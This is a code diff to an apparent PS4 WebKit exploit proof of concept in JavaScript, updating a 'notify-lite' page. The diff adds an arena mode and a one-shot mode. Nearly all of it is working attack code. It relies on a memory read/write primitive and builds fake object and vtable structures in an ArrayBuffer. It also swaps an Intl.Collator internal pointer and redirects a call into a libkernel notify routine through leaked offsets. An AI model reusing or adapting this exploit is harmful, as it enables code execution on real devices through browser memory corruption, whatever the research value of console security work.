@@ -1,12 +1,14 @@
 /**
  * Minimal PS4 Collator notify — core+mem only (no rw_demo / libkernel_resolve).
+ * Default: arena struct (OOM-safe). ?notifystr=1 = legacy 0xc30 JS string.
+ * ?oneshot=1 + lk in box: Start → pin → fire in one tap (no gap).
  */
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
 import { establishPrimitive, trimExploitDebris } from "./core.js";
 
-const BUILD = "notify-lite-1";
+const BUILD = "notify-lite-3";
 const params = new URLSearchParams(location.search);
 
 const COLLATOR_OFF = 0x18;
@@ -17,6 +19,8 @@ const MARK_OFF = 0xf00;
 const REQ_SIZE = 0xc30;
 const MSG_OFF = 0x2d;
 const MSG = "PS4 WebKit PoC";
+const USE_ARENA = params.get("notifystr") !== "1";
+const ONESHOT = params.get("oneshot") === "1";
 
 let lines = [];
 let ready = false;
@@ -68,11 +72,8 @@ function lkFromHex() {
     if (!p) return null;
     const kUsleep = 0x13b20;
     if ((p.low & 0x3fff) !== 0) {
-        const hits = [kUsleep, 0x13b20];
-        for (const rva of hits) {
-            const lk = p.sub32(rva);
-            if (lk.hi >= 0x80 && lk.hi <= 0x8f && (lk.low & 0x3fff) === 0) return lk;
-        }
+        const lk = p.sub32(kUsleep);
+        if (lk.hi >= 0x80 && lk.hi <= 0x8f && (lk.low & 0x3fff) === 0) return lk;
     }
     return p;
 }
@@ -90,7 +91,15 @@ function putLow48(view, off, ptr) {
     view[off + 7] = 0;
 }
 
-function buildReq() {
+function writeReqArena(view, baseOff) {
+    for (let i = 0; i < baseOff + MSG_OFF; i++) view[baseOff + i] = 0;
+    for (let i = 0; i < MSG.length; i++)
+        view[baseOff + MSG_OFF + i] = MSG.charCodeAt(i) & 0xff;
+    view[baseOff + MSG_OFF + MSG.length] = 0;
+    view[baseOff + 0x2c] = 1; // useIconImageUri
+}
+
+function buildReqString() {
     const trail = REQ_SIZE - MSG_OFF - MSG.length;
     return "\x00".repeat(MSG_OFF) + MSG + "\x00".repeat(trail);
 }
@@ -104,18 +113,27 @@ function arenaBacking(p, view) {
 }
 
 function doPin(p, off) {
-    log("PIN", "collator+arena");
+    log("PIN", "arena=" + USE_ARENA);
     const collator = new Intl.Collator("en", { usage: "search" });
     const compareFn = collator.compare;
     if (!(compareFn("a", "b") < 0)) throw new Error("collator fail");
-    const req = buildReq();
     const ab = new ArrayBuffer(ARENA_BYTES);
     const view = new Uint8Array(ab);
     view[MARK_OFF] = 0x52;
     view[MARK_OFF + 1] = 0x4f;
     view[MARK_OFF + 2] = 0x50;
     view[MARK_OFF + 3] = 0x31;
-    retain.push(collator, compareFn, ab, view, req);
+    let compareArg;
+    let reqStr = null;
+    if (USE_ARENA) {
+        writeReqArena(view, 0);
+        compareArg = "\x00";
+        retain.push(collator, compareFn, ab, view, compareArg);
+    } else {
+        reqStr = buildReqString();
+        compareArg = reqStr;
+        retain.push(collator, compareFn, ab, view, reqStr, compareArg);
+    }
     const collCell = p.leakval(collator);
     const backing = arenaBacking(p, view);
     if (!backing) throw new Error("arena +0x10 fail");
@@ -124,12 +142,23 @@ function doPin(p, off) {
     putLow48(view, FAKE_UC, fakeVT);
     for (let i = 0x48; i < 0x50; i++) view[FAKE_UC + i] = 0;
     for (let i = 0x60; i < 0x68; i++) view[FAKE_UC + i] = 0;
-    log("PIN-OK", "coll=" + collCell + " arena=" + backing);
+    if (USE_ARENA) {
+        putLow48(view, FAKE_UC + 0x48, backing);
+        view[FAKE_UC + 0x60] = REQ_SIZE & 0xff;
+        view[FAKE_UC + 0x61] = (REQ_SIZE >>> 8) & 0xff;
+        view[FAKE_UC + 0x62] = (REQ_SIZE >>> 16) & 0xff;
+        view[FAKE_UC + 0x63] = (REQ_SIZE >>> 24) & 0xff;
+    }
+    log("PREWARM", "unhooked compareFn");
+    const pre = compareFn(compareArg, "b");
+    if (!Number.isFinite(pre)) throw new Error("prewarm fail pre=" + pre);
+    log("PIN-OK", "coll=" + collCell + " arena=" + backing + " pre=" + pre);
     return {
-        collator, compareFn, req, view, backing, fakeUC, fakeVT,
+        collator, compareFn, compareArg, view, backing, fakeUC, fakeVT,
         field: collCell.add32(COLLATOR_OFF),
         gd: off.wk_notify_gd || 0x1aca,
         nt: off.k_notify || 0x19320,
+        arenaMode: USE_ARENA,
     };
 }
 
@@ -137,25 +166,26 @@ function doFire(p) {
     if (!pin) throw new Error("pin first");
     const lk = lkFromHex();
     if (!lk) throw new Error("paste fn or lk");
-    log("FIRE", "lk=" + lk);
+    log("FIRE", "lk=" + lk + " arena=" + pin.arenaMode);
     putLow48(pin.view, FAKE_UC + 0xe0, lk.add32(pin.nt));
     putLow48(pin.view, FAKE_VT + 0x128, lk.add32(pin.gd));
     const orig = p.read8(pin.field);
     p.write8(pin.field, pin.fakeUC);
     let res = NaN;
     let err = null;
-    try { res = pin.compareFn(pin.req, "b"); } catch (e) { err = e; }
+    try { res = pin.compareFn(pin.compareArg, "b"); } catch (e) { err = e; }
     p.write8(pin.field, orig);
     if (err) throw err;
     log("DONE", "result=" + res + (res === 0 ? " TOAST?" : ""));
     state(res === 0 ? "notify OK — check toast" : "errno " + res, res === 0 ? "ok" : "bad");
+    return res;
 }
 
 async function runStart() {
     if (busy || ready) return;
     busy = true;
     state("primitive…", "warn");
-    log("BOOT", BUILD);
+    log("BOOT", BUILD + " arena=" + USE_ARENA + " oneshot=" + ONESHOT);
     try {
         const carrier = await establishPrimitive({
             maxAttempts: parseInt(params.get("attempts") || "0", 10) || 0,
@@ -166,6 +196,20 @@ async function runStart() {
         if (!window.p) throw new Error("no window.p");
         try { trimExploitDebris(); log("TRIM", "groom freed"); } catch (_) { }
         ready = true;
+        if (ONESHOT) {
+            log("ONESHOT", "pin+fire sync");
+            const off = offsetsFor(navigator.userAgent).off;
+            if (!off) throw new Error("unknown FW");
+            pin = doPin(window.p, off);
+            if (lkFromHex()) {
+                doFire(window.p);
+                return;
+            }
+            log("ONESHOT-WAIT", "paste fn → Fire (or reload with lk in box)");
+            $("btn-fire").disabled = false;
+            state("pinned — paste fn → Fire", "ok");
+            return;
+        }
         log("PRIMITIVE-OK", "tap Pin then Fire");
         state("OK — Pin → paste fn → Fire", "ok");
         $("btn-pin").disabled = false;
@@ -220,8 +264,7 @@ function init() {
     $("btn-start").addEventListener("click", runStart);
     $("btn-pin").addEventListener("click", runPin);
     $("btn-fire").addEventListener("click", runFire);
-    log("READY", "lite page — no rw_demo graph");
-    state("tap Start", "");
+    state(ONESHOT ? "oneshot — paste lk → Start" : "arena notify lite", "");
 }
 
 init();
